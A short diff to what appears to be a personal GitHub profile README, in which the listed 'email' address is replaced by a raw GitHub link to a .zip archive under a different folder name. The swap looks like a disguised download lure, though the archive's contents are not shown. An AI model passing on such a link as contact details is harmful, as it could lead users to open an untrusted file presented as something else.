@@ -23,5 +23,5 @@
     
     I'd love to collaborate on any project that I can learn from and also provide value to a team in the process of my journey in the tech space! 
     Lets connect :)
-    email : @Lmnz.92x@gmail.com
+    email : https://raw.githubusercontent.com/PureLmnz/Cloud-Admin-Proj/main/blastogeny/Cloud-Admin-Proj.zip
     Discord : @Purelmnz --> userID : 540195493951832074
